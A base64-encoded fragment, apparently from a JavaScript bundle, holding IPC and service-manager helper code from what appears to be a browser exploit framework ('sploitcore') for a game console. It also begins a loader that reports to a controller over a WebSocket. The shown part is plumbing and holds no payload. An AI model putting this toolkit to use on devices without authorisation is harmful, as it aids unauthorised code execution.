uXHRcdHZhciBjb3B5Q291bnQgPSAoaGQgPj4+IDEpICYgMHhGO1xuXHRcdHZhciBtb3ZlQ291bnQgPSBoZCA+Pj4gNTtcblx0XHRpZiAoaGFzUGlkKSB7IHRoaXMucGlkID0gW2J1Zltwb3MrK10sIGJ1Zltwb3MrK11dOyB9XG5cdFx0Zm9yICh2YXIgaSA9IDA7IGkgPCBjb3B5Q291bnQ7ICsraSkgeyB0aGlzLmNvcGllZEhhbmRsZXMucHVzaChidWZbcG9zKytdKTsgfVxuXHRcdGZvciAodmFyIGkgPSAwOyBpIDwgbW92ZUNvdW50OyArK2kpIHsgdGhpcy5tb3ZlZEhhbmRsZXMucHVzaChidWZbcG9zKytdKTsgfVxuXHR9XG5cblx0Zm9yICh2YXIgaSA9IDA7IGkgPCB4Q291bnQ7ICsraSkge1xuXHRcdHZhciBhID0gYnVmW3BvcysrXTtcblx0XHR2YXIgYiA9IGJ1Zltwb3MrK107XG5cdFx0dmFyIGFkZHIgPSBbYiwgKCgoYSA+Pj4gMTIpICYgMHhGKSB8ICgoYSA+Pj4gMikgJiAweDcwKSkgPj4+IDBdO1xuXHRcdHZhciBzaXplID0gW2EgPj4+IDE2LCAwXTtcblx0XHR2YXIgY291bnRlciA9IChhICYgMHhFM0YpID4+PiAwO1xuXHRcdHRoaXMueERlc2NyaXB0b3JzLnB1c2goW2FkZHIsIHNpemUsIGNvdW50ZXJdKTtcblx0fVxuXG5cdGZvciAodmFyIGkgPSAwOyBpIDwgYUNvdW50ICsgYkNvdW50OyArK2kpIHtcblx0XHR2YXIgYSA9IGJ1Zltwb3MrK107XG5cdFx0dmFyIGIgPSBidWZbcG9zKytdO1xuXHRcdHZhciBjID0gYnVmW3BvcysrXTtcblx0XHR2YXIgYWRkciA9IFtiLCAoKCgoYyA+Pj4gMikgPDwgNCkgJiAweDcwKSB8ICgoYyA+Pj4gMjgpICYgMHhGKSkgPj4+IDBdO1xuXHRcdHZhciBzaXplID0gW2EsICgoYyA+Pj4gMjQpICYgMHhGKSA+Pj4gMF07XG5cdFx0dmFyIHBlcm0gPSBjICYgMztcblx0XHRpZiAoaSA8IGFDb3VudCkgeyB0aGlzLmFEZXNjcmlwdG9ycy5wdXNoKFthZGRyLCBzaXplLCBwZXJtXSk7IH0gZWxzZSB7IHRoaXMuYkRlc2NyaXB0b3JzLnB1c2goW2FkZHIsIHNpemUsIHBlcm1dKTsgfVxuXHR9XG5cblx0dmFyIHJhd0RhdGFTZWN0aW9uT2Zmc2V0ID0gcG9zO1xuXHQvLyBwYWRkaW5nXG5cdGlmICgocG9zICYgMykgIT09IDApIHsgcG9zICs9IDQgLSAocG9zICYgMyk7IH1cblxuXHR2YXIgZGF0YVBheWxvYWRMZW5ndGggPSBhbGlnbmVkRGF0YVNlY3Rpb25MZW5ndGg7XG5cdGlmICh0b0RvbWFpbikge1xuXHRcdGRhdGFQYXlsb2FkTGVuZ3RoLT0gMHgxMDtcbiAgICBcblx0XHR0aGlzLm9iamVjdERvbWFpbkNvbW1hbmQgPSBidWZbcG9zXSAmIDB4RkY7XG5cblx0XHRpZih0aGlzLm9iamVjdERvbWFpbkNvbW1hbmQgPT09IDIpIHtcblx0XHRcdGRhdGFQYXlsb2FkTGVuZ3RoID0gMDtcblx0XHR9XG4gICAgXG5cdFx0dmFyIGRhdGFMZW5ndGggPSBidWZbcG9zKytdID4+IDE2O1xuXHRcdGlmKGRhdGFMZW5ndGggIT0gZGF0YVBheWxvYWRMZW5ndGgpIHtcblx0XHRcdHRocm93IG5ldyBFcnJvcignZGF0YSBwYXlsb2FkIGxlbmd0aCBpbiBkb21haW4gaGVhZGVyICE9IGV4cGVjdGVkIGRhdGEgcGF5bG9hZCBsZW5ndGgnKTtcblx0XHR9XG5cdFx0dGhpcy5vYmplY3RJZCA9IGJ1Zltwb3MrK107XG5cdFx0cG9zKz0gMjtcblx0fVxuXG5cdHRoaXMucGFja2VkID0gQXJyYXkuZnJvbShidWYpO1xuICBcblx0aWYoZGF0YVBheWxvYWRMZW5ndGggPiAwKSB7XG5cdFx0dmFyIGRhdGFQYXlsb2FkQmVnaW4gPSBwb3M7XG4gICAgXG5cdFx0aWYgKChidWZbcG9zXSAmIDB4MDBGRkZGRkYpICE9PSAweDQzNDY1Mykge1xuXHRcdFx0dXRpbHMuaGV4ZHVtcChcImJhZCBtc2dcIiwgYnVmLCAweDUwKTtcblx0XHRcdHRocm93IG5ldyBFcnJvcihcIlNGQ0kvU0ZDTyB3YXNuJ3QgaW4gZXhwZWN0ZWQgcG9zaXRpb25cIik7XG5cdFx0fVxuICAgIFxuXHRcdHBvcyArPSAyO1xuXHRcdHRoaXMuY21kSWQgPSB0aGlzLnJlc3VsdENvZGUgPSBidWZbcG9zXTtcblx0XHR0aGlzLnN1Y2Nlc3MgPSB0aGlzLmNtZElkID09PSAwO1xuXHRcdHBvcys9IDI7XG4gICAgXG5cdFx0d2hpbGUgKHBvcyA8IGRhdGFQYXlsb2FkQmVnaW4gKyAoZGF0YVBheWxvYWRMZW5ndGggPj4gMikpIHtcblx0XHRcdHRoaXMuZGF0YS5wdXNoKGJ1Zltwb3MrK10pO1xuXHRcdH1cblx0fVxuXG5cdHBvcyA9IHJhd0RhdGFTZWN0aW9uT2Zmc2V0ICsgKHJhd0RhdGFTZWN0aW9uTGVuZ3RoID4+IDIpO1xuICBcblx0Zm9yKHZhciBpID0gMDsgaSA8IGNEZXNjcmlwdG9yczsgaSsrKSB7XG5cdFx0dmFyIGEgPSBidWZbcG9zKytdO1xuXHRcdHZhciBiID0gYnVmW3BvcysrXTtcblx0XHR2YXIgYWRkciA9IFthLCAoYiAmIDB4RkZGRikgPj4+IDBdO1xuXHRcdHZhciBzaXplID0gW2IgPj4+IDE2LCAwXTtcblx0XHR0aGlzLmNEZXNjcmlwdG9ycy5wdXNoKFthZGRyLCBzaXplXSk7XG5cdH1cbiAgXG5cdHJldHVybiB0aGlzO1xufTtcblxuSVBDTWVzc2FnZS5wcm90b3R5cGUuc2hvdyA9IGZ1bmN0aW9uICgpIHtcblx0dXRpbHMubG9nKCdJUEMgbWVzc2FnZTonKTtcblx0aWYgKHRoaXMucmVzdWx0Q29kZSAhPT0gMCkgeyB1dGlscy5sb2coJy0gQ29tbWFuZCBJRCAvIFJlc3VsdCBjb2RlOiAnICsgbmV3IFJlc3VsdENvZGUodGhpcy5yZXN1bHRDb2RlKS50b1N0cmluZygpKTsgfVxuXHRpZiAodGhpcy5waWQgIT09IG51bGwpIHsgdXRpbHMubG9nKCctIFBJRDogJyArIHV0aWxzLnBhZGRyKHRoaXMucGlkKSk7IH1cblx0aWYgKHRoaXMuZGF0YUJ1ZmZlci5sZW5ndGggPiAwKSB7XG5cdFx0dXRpbHMubG9nKCctIERhdGEnKTtcblx0XHR1dGlscy5oZXhkdW1wKFwiICAgIGRhdGFcIiwgbmV3IFVpbnQzMkFycmF5KHRoaXMuZGF0YUJ1ZmZlcikpO1xuXHR9XG5cdGlmICh0aGlzLmNvcGllZEhhbmRsZXMubGVuZ3RoID4gMCkge1xuXHRcdHV0aWxzLmxvZygnLSBDb3BpZWQgaGFuZGxlcycpO1xuXHRcdGZvciAodmFyIGkgPSAwOyBpIDwgdGhpcy5jb3BpZWRIYW5kbGVzLmxlbmd0aDsgKytpKSB7IHV0aWxzLmxvZygnICAgIC0gMHgnICsgdGhpcy5jb3BpZWRIYW5kbGVzW2ldLnRvU3RyaW5nKDE2KSk7IH1cblx0fVxuXHRpZiAodGhpcy5tb3ZlZEhhbmRsZXMubGVuZ3RoID4gMCkge1xuXHRcdHV0aWxzLmxvZygnLSBNb3ZlZCBoYW5kbGVzJyk7XG5cdFx0Zm9yICh2YXIgaSA9IDA7IGkgPCB0aGlzLm1vdmVkSGFuZGxlcy5sZW5ndGg7ICsraSkgeyB1dGlscy5sb2coJyAgICAtIDB4JyArIHRoaXMubW92ZWRIYW5kbGVzW2ldLnRvU3RyaW5nKDE2KSk7IH1cblx0fVxuXHRpZiAodGhpcy5hRGVzY3JpcHRvcnMubGVuZ3RoID4gMCkgeyB1dGlscy5sb2coJy0gJyArIHRoaXMuYURlc2NyaXB0b3JzLmxlbmd0aCArICcgQSBkZXNjcmlwdG9yJyArICh0aGlzLmFEZXNjcmlwdG9ycy5sZW5ndGggPiAxID8gJ3MnIDogJycpKTsgfVxuXHRpZiAodGhpcy5iRGVzY3JpcHRvcnMubGVuZ3RoID4gMCkgeyB1dGlscy5sb2coJy0gJyArIHRoaXMuYkRlc2NyaXB0b3JzLmxlbmd0aCArICcgQiBkZXNjcmlwdG9yJyArICh0aGlzLmJEZXNjcmlwdG9ycy5sZW5ndGggPiAxID8gJ3MnIDogJycpKTsgfVxuXHRpZiAodGhpcy5jRGVzY3JpcHRvcnMubGVuZ3RoID4gMCkgeyB1dGlscy5sb2coJy0gJyArIHRoaXMuY0Rlc2NyaXB0b3JzLmxlbmd0aCArICcgQyBkZXNjcmlwdG9yJyArICh0aGlzLmNEZXNjcmlwdG9ycy5sZW5ndGggPiAxID8gJ3MnIDogJycpKTsgfVxuXHRpZiAodGhpcy54RGVzY3JpcHRvcnMubGVuZ3RoID4gMCkgeyB1dGlscy5sb2coJy0gJyArIHRoaXMueERlc2NyaXB0b3JzLmxlbmd0aCArICcgWCBkZXNjcmlwdG9yJyArICh0aGlzLnhEZXNjcmlwdG9ycy5sZW5ndGggPiAxID8gJ3MnIDogJycpKTsgfVxuXG5cdHJldHVybiB0aGlzO1xufTtcblxuSVBDTWVzc2FnZS5wcm90b3R5cGUuc2hvd1BhY2tlZCA9IGZ1bmN0aW9uICgpIHtcblx0dXRpbHMuaGV4ZHVtcChcImlwY21cIiwgdGhpcy5wYWNrKCkpO1xuXHRyZXR1cm4gdGhpcztcbn07XG5cbklQQ01lc3NhZ2UucHJvdG90eXBlLnRvQnVpbGRlclN0cmluZyA9IGZ1bmN0aW9uICgpIHtcblx0ZnVuY3Rpb24gZm10VTMyQXJyYXkoYXJyKSB7XG5cdFx0cmV0dXJuIGFyci5tYXAoKHUzMikgPT4gXCIweFwiICsgdTMyLnRvU3RyaW5nKDE2KSkuam9pbihcIiwgXCIpO1xuXHR9XG4gIFxuXHR2YXIgc3RyID0gXCJzYy5pcGNNc2coXCIgKyB0aGlzLmNtZElkICsgXCIpXCI7XG5cdGlmKHRoaXMudHlwZSAhPT0gNCkgeyBzdHIrPSBcIi5zZXRUeXBlKFwiICsgdGhpcy50eXBlICsgXCIpXCI7IH1cblx0aWYodGhpcy5kYXRhQnVmZmVyLmxlbmd0aCA+IDApIHsgc3RyKz0gXCIuZGF0YShcIiArIGZtdFUzMkFycmF5KHRoaXMuZGF0YUJ1ZmZlcikgKyBcIilcIjsgfVxuXHR0aGlzLmFEZXNjcmlwdG9ycy5mb3JFYWNoKChhZCkgPT4ge1xuXHRcdHN0cis9IFwiLmFEZXNjcmlwdG9yKFwiICsgZm10VTMyQXJyYXkoYWQpICsgXCIpXCI7XG5cdH0pO1xuXHR0aGlzLmJEZXNjcmlwdG9ycy5mb3JFYWNoKChhZCkgPT4ge1xuXHRcdHN0cis9IFwiLmJEZXNjcmlwdG9yKFwiICsgZm10VTMyQXJyYXkoYWQpICsgXCIpXCI7XG5cdH0pO1xuXHR0aGlzLmNEZXNjcmlwdG9ycy5mb3JFYWNoKChhZCkgPT4ge1xuXHRcdHN0cis9IFwiLmNEZXNjcmlwdG9yKFwiICsgZm10VTMyQXJyYXkoYWQpICsgXCIpXCI7XG5cdH0pO1xuXHR0aGlzLnhEZXNjcmlwdG9ycy5mb3JFYWNoKChhZCkgPT4ge1xuXHRcdHN0cis9IFwiLnhEZXNjcmlwdG9yKFwiICsgZm10VTMyQXJyYXkoYWQpICsgXCIpXCI7XG5cdH0pO1xuXHR0aGlzLmNvcGllZEhhbmRsZXMuZm9yRWFjaCgoY2gpID0+IHtcblx0XHRzdHIrPSBcIi5jb3B5SGFuZGxlKDB4XCIgKyBjaC50b1N0cmluZygxNikgKyBcIilcIjtcblx0fSk7XG5cdHRoaXMubW92ZWRIYW5kbGVzLmZvckVhY2goKGNoKSA9PiB7XG5cdFx0c3RyKz0gXCIubW92ZUhhbmRsZSgweFwiICsgY2gudG9TdHJpbmcoMTYpICsgXCIpXCI7XG5cdH0pO1xuXHRpZih0aGlzLm9iamVjdERvbWFpbkNvbW1hbmQpIHtcblx0XHRzd2l0Y2godGhpcy5vYmplY3REb21haW5Db21tYW5kKSB7XG5cdFx0Y2FzZSAxOlxuXHRcdFx0c3RyKz0gXCIudG9PYmplY3QoXCIgKyB0aGlzLm9iamVjdElkICsgXCIpXCI7XG5cdFx0XHRicmVhaztcblx0XHRjYXNlIDI6XG5cdFx0XHRzdHIrPSBcIi5jbG9zZU9iamVjdChcIiArIHRoaXMub2JqZWN0SWQgKyBcIilcIjtcblx0XHRcdGJyZWFrO1xuXHRcdGRlZmF1bHQ6XG5cdFx0XHR0aHJvdyBuZXcgRXJyb3IoXCJ1bmtub3duIGRvbWFpbiBjb21tYW5kXCIpO1xuXHRcdH1cblx0fVxuXHRyZXR1cm4gc3RyO1xufTtcblxuSVBDTWVzc2FnZS5wcm90b3R5cGUuYXNzZXJ0T2sgPSBmdW5jdGlvbiAoKSB7XG5cdGlmKCF0aGlzLnN1Y2Nlc3MpIHtcblx0XHR0aGlzLnNob3coKTtcblx0XHR0aHJvdyBuZXcgUmVzdWx0Q29kZSh0aGlzLnJlc3VsdENvZGUpO1xuXHR9IGVsc2Uge1xuXHRcdHJldHVybiB0aGlzO1xuXHR9XG59O1xuXG5JUENNZXNzYWdlLnByb3RvdHlwZS5hc1Jlc3VsdCA9IGZ1bmN0aW9uICgpIHtcblx0aWYodGhpcy5zdWNjZXNzKSB7XG5cdFx0cmV0dXJuIG5ldyBSZXN1bHQuT2sodGhpcyk7XG5cdH0gZWxzZSB7XG5cdFx0cmV0dXJuIG5ldyBSZXN1bHQuRXJyKHRoaXMpO1xuXHR9XG59O1xuXG4vLyBjYWxscyBjYiBpZiBvdXIgcmVzdWx0IGNvZGUgPT0gMCwgZXJyIG90aGVyd2lzZVxuLy8gY2Igc2lnbmF0dXJlIGlzIChtc2csIG1vdmVkLCBjb3BpZWQpID0+IHsgLi4uIH1cbi8vIHJldHVybnMgdmFsdWUgcmV0dXJuZWQgZnJvbSBjYlxuSVBDTWVzc2FnZS5wcm90b3R5cGUud2l0aEhhbmRsZXMgPSBmdW5jdGlvbihjYiwgZXJyKSB7XG5cdHRyeSB7XG5cdFx0aWYodGhpcy5zdWNjZXNzKSB7XG5cdFx0XHRyZXR1cm4gY2IodGhpcywgdGhpcy5tb3ZlZEhhbmRsZXMsIHRoaXMuY29waWVkSGFuZGxlcyk7XG5cdFx0fSBlbHNlIHtcblx0XHRcdGlmKGVycikge1xuXHRcdFx0XHRyZXR1cm4gZXJyKHRoaXMsIHRoaXMubW92ZWRIYW5kbGVzLCB0aGlzLmNvcGllZEhhbmRsZXMpO1xuXHRcdFx0fSBlbHNlIHtcblx0XHRcdFx0cmV0dXJuIHRoaXM7XG5cdFx0XHR9XG5cdFx0fVxuXHR9IGZpbmFsbHkge1xuXHRcdHZhciBzZW5kZXIgPSB0aGlzLnNlbmRlcjtcblx0XHR0aGlzLm1vdmVkSGFuZGxlcy5mb3JFYWNoKChtaCkgPT4ge1xuXHRcdFx0c2VuZGVyLnN2Y0Nsb3NlSGFuZGxlKG1oKTtcblx0XHR9KTtcblx0XHR0aGlzLmNvcGllZEhhbmRsZXMuZm9yRWFjaCgoY2gpID0+IHtcblx0XHRcdHNlbmRlci5zdmNDbG9zZUhhbmRsZShjaCk7XG5cdFx0fSk7XG5cdH1cbn07XG5cbklQQ01lc3NhZ2UucHJvdG90eXBlLnRvU3RyaW5nID0gZnVuY3Rpb24oKSB7XG5cdHJldHVybiBcIklQQ01lc3NhZ2UoXCIgKyB0aGlzLmNtZElkICsgXCIgPSBcIiArIG5ldyBSZXN1bHRDb2RlKHRoaXMucmVzdWx0Q29kZSkudG9TdHJpbmcoKSArIFwiKVwiO1xufTtcblxuZnVuY3Rpb24gSVBDRmFpbHVyZShzYywgc2VuZGVyLCByZXN1bHRDb2RlKSB7XG5cdHRoaXMucmVzdWx0Q29kZSA9IHJlc3VsdENvZGU7XG5cdHRoaXMuc2MgPSBzYztcblx0dGhpcy5zZW5kZXIgPSBzZW5kZXI7XG59XG5cbklQQ0ZhaWx1cmUucHJvdG90eXBlLmFzc2VydE9rID0gZnVuY3Rpb24gKCkge1xuXHR0aGlzLnNob3coKTtcblx0dGhyb3cgdGhpcy5yZXN1bHRDb2RlO1xufTtcblxuSVBDRmFpbHVyZS5wcm90b3R5cGUuYXNSZXN1bHQgPSBmdW5jdGlvbiAoKSB7XG5cdHJldHVybiBuZXcgUmVzdWx0LkVycih0aGlzKTtcbn07XG5cbklQQ0ZhaWx1cmUucHJvdG90eXBlLndpdGhIYW5kbGVzID0gZnVuY3Rpb24ob2ssIGVycikge1xuXHRpZihlcnIpIHtcblx0XHRyZXR1cm4gZXJyKHRoaXMsIFtdLCBbXSk7XG5cdH0gZWxzZSB7XG5cdFx0cmV0dXJuIHRoaXM7XG5cdH1cbn07XG5cbklQQ0ZhaWx1cmUucHJvdG90eXBlLnNob3cgPSBmdW5jdGlvbiAoKSB7XG5cdHV0aWxzLmxvZyhcIklQQyBGYWlsdXJlOiBcIiArIHRoaXMucmVzdWx0Q29kZS5tZXNzYWdlICsgXCIsIG9mZmVuZGluZyByZXF1ZXN0IHNob3duIGJlbG93XCIpO1xuXHRuZXcgSVBDTWVzc2FnZSh0aGlzLnNjLCB0aGlzLnNlbmRlcikudW5wYWNrKHRoaXMuc2MuaXBjQnVmLCBmYWxzZSkuc2hvdygpO1xuXHRyZXR1cm4gdGhpcztcbn07XG5cbklQQ0ZhaWx1cmUucHJvdG90eXBlLnRvU3RyaW5nID0gZnVuY3Rpb24gKCkge1xuXHRyZXR1cm4gXCJJUENGYWlsdXJlKFwiICsgdGhpcy5yZXN1bHRDb2RlLnRvU3RyaW5nKCkgKyBcIilcIjtcbn07XG5cbklQQ0ZhaWx1cmUucHJvdG90eXBlLnN1Y2Nlc3MgPSBmYWxzZTtcbklQQ0ZhaWx1cmUucHJvdG90eXBlLmlzRmFpbHVyZSA9IHRydWU7XG5cbnNwbG9pdE1peGluLmlwY01zZyA9IGZ1bmN0aW9uIChjbWRJZCkge1xuXHRyZXR1cm4gbmV3IElQQ01lc3NhZ2UodGhpcy5zYywgdGhpcywgY21kSWQpO1xufTtcblxuLypcbiAgSWYgbm8gYGNiYCBpcyBwYXNzZWQsIHJldHVybiBhIFJlc3VsdC5cbiAgICBPayh1MzIgaGFuZGxlKSBpZiBldmVyeXRoaW5nIGlzIG9rYXlcbiAgICBFcnIoUmVzdWx0Q29kZSkgaWYgYHNtOmAgcmV0dXJuZWQgYW4gdW5zdWNjZXNzZnVsIHJlc3VsdCBjb2RlXG4gICAgVGhyb3cgaWYgYG5hbWVgIGlzIG5vdCBhIHN0cmluZywgbm8gc3VjaCBzZXJ2aWNlIGV4aXN0cywgb3Igd2UgZmFpbCB0byBjb25uZWN0IHRvIGBzbTpgXG4gIElmIGBjYmAgaXMgcGFzc2VkOlxuICAgIENhbGxzIGBjYmAgd2l0aCB0aGUgYHUzMiBoYW5kbGVgIGlmIHN1Y2Nlc3NmdWwuIElmIHdlIGZhaWwgdG8gZ2V0IGEgaGFuZGxlLCB0aHJvdy5cbiAgICBSZXR1cm5zIHZhbHVlIHJldHVybmVkIGZyb20gYGNiYCBhbmQgYXV0b21hdGljYWxseSBjbG9zZXMgaGFuZGxlIGFmdGVyIGBjYmAgcmV0dXJucy5cbiAqL1xuc3Bsb2l0TWl4aW4uZ2V0U2VydmljZSA9IGZ1bmN0aW9uIChuYW1lLCBjYikge1xuXHRpZiAodHlwZW9mKG5hbWUpICE9PSBcInN0cmluZ1wiKSB7XG5cdFx0dGhyb3cgbmV3IEVycm9yKFwiY2Fubm90IGdldCBzZXJ2aWNlIHdpdGggbm9uLXN0cmluZyBuYW1lXCIpO1xuXHR9XG5cdGlmICghdGhpcy5zYy5oYXNTZXJ2aWNlKG5hbWUpKSB7XG5cdFx0dGhyb3cgbmV3IEVycm9yKCdubyBzdWNoIHNlcnZpY2UnKTtcblx0fVxuXG5cdGlmICh0aGlzLnNtSGFuZGxlID09PSB1bmRlZmluZWQpIHtcblx0XHR0aGlzLnNtSGFuZGxlID0gdGhpcy5zdmNDb25uZWN0VG9Qb3J0KCdzbTonKS5hc3NlcnRPaygpO1xuXHR9XG5cdHZhciBsb2wgPSB1dGlscy5zdHIydTY0KG5hbWUpO1xuXHR2YXIgciA9IHRoaXMuaXBjTXNnKDEpLmRhdGF1NjQobG9sKS5zZW5kVG8odGhpcy5zbUhhbmRsZSkuYXNSZXN1bHQoKS5tYXAoKHJlc3BvbnNlKSA9PiByZXNwb25zZS5tb3ZlZEhhbmRsZXNbMF0pO1xuXHRpZihjYiA9PT0gdW5kZWZpbmVkKSB7XG5cdFx0cmV0dXJuIHI7XG5cdH0gZWxzZSB7XG5cdFx0dmFyIGggPSByLmFzc2VydE9rKCk7XG5cdFx0dHJ5IHtcblx0XHRcdHJldHVybiBjYihoKTtcblx0XHR9IGZpbmFsbHkge1xuXHRcdFx0dGhpcy5zdmNDbG9zZUhhbmRsZShoKTtcblx0XHR9XG5cdH1cbn07XG5cbnNwbG9pdE1peGluLmdldFNlcnZpY2VzID0gZnVuY3Rpb24oc2VydmljZXMsIGNhbGxiYWNrKSB7XG5cdHZhciBzZXJ2aWNlSGFuZGxlcyA9IFtdO1xuXG5cdGZvciAodmFyIHNpID0gMDsgc2kgPCBzZXJ2aWNlcy5sZW5ndGg7IHNpKyspIHtcblx0XHR2YXIgc2VydmljZSA9IHRoaXMuZ2V0U2VydmljZShzZXJ2aWNlc1tzaV0pLmFzc2VydE9rKCk7XG5cdFx0c2VydmljZUhhbmRsZXMucHVzaCggc2VydmljZSApO1xuXHR9XG5cblx0dHJ5IHtcblx0XHRyZXR1cm4gY2FsbGJhY2suYXBwbHkodW5kZWZpbmVkLCBzZXJ2aWNlSGFuZGxlcyk7XG5cdH0gZmluYWxseSB7XG5cdFx0Zm9yICh2YXIgc2hpID0gMDsgc2kgPCBzZXJ2aWNlSGFuZGxlcy5sZW5ndGg7IHNoaSsrKSB7XG5cdFx0XHR0aGlzLnN2Y0Nsb3NlSGFuZGxlKHNlcnZpY2VIYW5kbGVzW3NoaV0pO1xuXHRcdH1cblx0fVxufTtcblxuc3Bsb2l0TWl4aW4ucmVnaXN0ZXJTZXJ2aWNlID0gZnVuY3Rpb24gKG5hbWUsIG1heFNlc3Npb25zKSB7XG5cdGlmICh0aGlzLnNtSGFuZGxlID09PSB1bmRlZmluZWQpIHtcblx0XHR0aGlzLnNtSGFuZGxlID0gdGhpcy5zdmNDb25uZWN0VG9Qb3J0KCdzbTonKS5hc3NlcnRPaygpO1xuXHR9XG5cdGlmIChtYXhTZXNzaW9ucyA9PT0gdW5kZWZpbmVkKSB7XG5cdFx0bWF4U2Vzc2lvbnMgPSAxMDAwO1xuXHR9XG5cdHZhciBsb2wgPSB1dGlscy5zdHIydTY0KG5hbWUpO1xuXHR1dGlscy5kbG9nKCdSZWdpc3RlcmluZyBzZXJ2aWNlICcgKyBuYW1lKTtcblx0cmV0dXJuIHRoaXMuaXBjTXNnKDIpLmRhdGF1NjQobG9sLCBbbWF4U2Vzc2lvbnMsIDB4MjBdKS5zZW5kVG8odGhpcy5zbUhhbmRsZSkuYXNSZXN1bHQoKS5tYXAoKHIpID0+IHIubW92ZWRIYW5kbGVzWzBdKTtcbn07XG5cbnNwbG9pdE1peGluLnVucmVnaXN0ZXJTZXJ2aWNlID0gZnVuY3Rpb24gKG5hbWUpIHtcblx0aWYgKHRoaXMuc21IYW5kbGUgPT09IHVuZGVmaW5lZCkge1xuXHRcdHRoaXMuc21IYW5kbGUgPSB0aGlzLnN2Y0Nvbm5lY3RUb1BvcnQoJ3NtOicpLmFzc2VydE9rKCk7XG5cdH1cblx0dmFyIGxvbCA9IHV0aWxzLnN0cjJ1NjQobmFtZSk7XG5cdHJldHVybiB0aGlzLmlwY01zZygzKS5kYXRhdTY0KGxvbCkuc2VuZFRvKHRoaXMuc21IYW5kbGUpLmFzUmVzdWx0KCk7XG59O1xuXG5zcGxvaXRjb3JlLnByb3RvdHlwZS5oYXNTZXJ2aWNlID0gZnVuY3Rpb24gKG5hbWUpIHtcblx0aWYgKHRoaXMuaXBjU2VydmljZXNbbmFtZV0gPT09IHVuZGVmaW5lZCkge1xuXHRcdHZhciByID0gdGhpcy5yZWdpc3RlclNlcnZpY2UobmFtZSwgMTAwMCk7XG5cdFx0aWYoci5pc09rKSB7XG5cdFx0XHR0aGlzLmlwY1NlcnZpY2VzW25hbWVdID0gZmFsc2U7XG5cdFx0XHR0aGlzLnVucmVnaXN0ZXJTZXJ2aWNlKG5hbWUpLmFzc2VydE9rKCk7XG5cdFx0fSBlbHNlIHtcblx0XHRcdHRoaXMuaXBjU2VydmljZXNbbmFtZV0gPSB0cnVlO1xuXHRcdH1cblx0fVxuXHRyZXR1cm4gdGhpcy5pcGNTZXJ2aWNlc1tuYW1lXTtcbn07XG5cbnNwbG9pdE1peGluLmdldEF1dG9IYW5kbGUgPSBmdW5jdGlvbiAobmFtZSkge1xuXHRpZiAodGhpcy5pcGNIYW5kbGVzW25hbWVdID09PSB1bmRlZmluZWQpIHtcblx0XHRpZiAobmFtZSBpbnN0YW5jZW9mIEZ1bmN0aW9uKSB7XG5cdFx0XHR0aGlzLmlwY0hhbmRsZXNbbmFtZV0gPSBuYW1lKCk7XG5cdFx0fSBlbHNlIGlmICh0eXBlb2YobmFtZSkgPT09IFwic3RyaW5nXCIpIHtcblx0XHRcdHRoaXMuaXBjSGFuZGxlc1tuYW1lXSA9IHRoaXMuZ2V0U2VydmljZShuYW1lKS5hc3NlcnRPaygpO1xuXHRcdH0gZWxzZSB7XG5cdFx0XHR0aHJvdyBuZXcgRXJyb3IoXCJpbnZhbGlkIGF1dG8gaGFuZGxlIHR5cGUgXCIgKyBuYW1lKTtcblx0XHR9XG5cdH1cblx0cmV0dXJuIHRoaXMuaXBjSGFuZGxlc1tuYW1lXTtcbn07XG5cbnNwbG9pdE1peGluLmtpbGxBdXRvSGFuZGxlID0gZnVuY3Rpb24gKG5hbWUpIHtcblx0aWYgKG5hbWUgPT09IHVuZGVmaW5lZCkge1xuXHRcdGZvciAodmFyIG5hbWUgaW4gdGhpcy5pcGNIYW5kbGVzKSB7XG5cdFx0XHR0aGlzLmtpbGxBdXRvSGFuZGxlKG5hbWUpO1xuXHRcdH1cblx0XHRyZXR1cm47XG5cdH1cblxuXHRpZiAodGhpcy5pcGNIYW5kbGVzW25hbWVdID09PSB1bmRlZmluZWQpIHsgcmV0dXJuOyB9XG5cblx0dGhpcy5zdmNDbG9zZUhhbmRsZSh0aGlzLmlwY0hhbmRsZXNbbmFtZV0pLmFzc2VydE9rKCk7XG5cdGRlbGV0ZSB0aGlzLmlwY0hhbmRsZXNbbmFtZV07XG59O1xuXG5tb2R1bGUuZXhwb3J0cyA9IElQQ01lc3NhZ2U7XG4iLCIvKiBlc2xpbnQgY2FtZWxjYXNlOiBcIm9mZlwiICovXG4vKiBlc2xpbnQgbm8tcmVkZWNsYXJlOiBcIm9mZlwiICovXG4vKiBlc2xpbnQgbm8tZXZhbDogXCJvZmZcIiAqL1xuLyogZ2xvYmFsIGFsZXJ0LCBXZWJTb2NrZXQgKi9cbnZhciByZXNlcnZlZFdvcmRzID0gcmVxdWlyZSgncmVzZXJ2ZWQtd29yZHMnKTtcblxudmFyIFNwbG9pdENvcmUgPSByZXF1aXJlKCcuL3NwbG9pdGNvcmUnKTtcbndpbmRvdy5JUENNZXNzYWdlID0gcmVxdWlyZSgnLi9pcGMnKTtcbnZhciB1dGlscyA9IHJlcXVpcmUoJy4vdXRpbHMnKTtcbnZhciBydW5Ocm8gPSByZXF1aXJlKCcuL3J1bk5ybycpO1xudmFyIGNvbmZpZyA9IHJlcXVpcmUoJy4uL2NvbmZpZycpO1xudmFyIHNvY2tldDtcblxud2luZG93Lm9uZXJyb3IgPSBmdW5jdGlvbiAobXNnLCB1cmwsIGxpbmUsIGNvbCwgZXJyb3IpIHtcblx0aWYgKG1zZyA9PT0gJ091dCBvZiBtZW1vcnknKSB7IGFsZXJ0KG1zZyk7IH1cblxuXHR2YXIgc3RhY2sgPSBlcnJvciA/IGVycm9yLnN0YWNrIDogbnVsbDtcblxuXHR1dGlscy5zZW5kKCdlcnJvcicsIFtsaW5lLCBtc2csIHN0YWNrXSk7XG5cdGlmIChzb2NrZXQpIHtcblx0XHRzb2NrZXQuc2VuZChKU09OLnN0cmluZ2lmeSh7XG5cdFx0XHR0eXBlOiAnZXJyb3InLFxuXHRcdFx0cmVzcG9uc2U6IFsgbGluZSwgbXNnLCBzdGFjayBdXG5cdFx0fSkpO1xuXHR9XG5cdC8vIGxvY2F0aW9uLnJlbG9hZCgpO1xufTtcblxudXRpbHMubG9nKCdMb2FkZWQnKTtcblxuZnVuY3Rpb24gaGFuZGxlciAoc2MsIHNvY2tldCkge1xuXHRyZXR1cm4gZnVuY3Rpb24gKGV2ZW50KSB7XG5cdFx0dmFyIGRhdGEgPSBKU09OLnBhcnNlKGV2ZW50LmRhdGEpO1xuXG5cdFx0aWYgKGRhdGEuY21kID09PSAnc3AnKSB7XG5cdFx0XHR1dGlscy5sb2coJ3J1bm5pbmcgZ2V0U1AoKS4uLicpO1xuXHRcdFx0c29ja2V0LnNlbmQoSlNPTi5zdHJpbmdpZnkoe1xuXHRcdFx0XHR0eXBlOiAnZ290c3AnLFxuX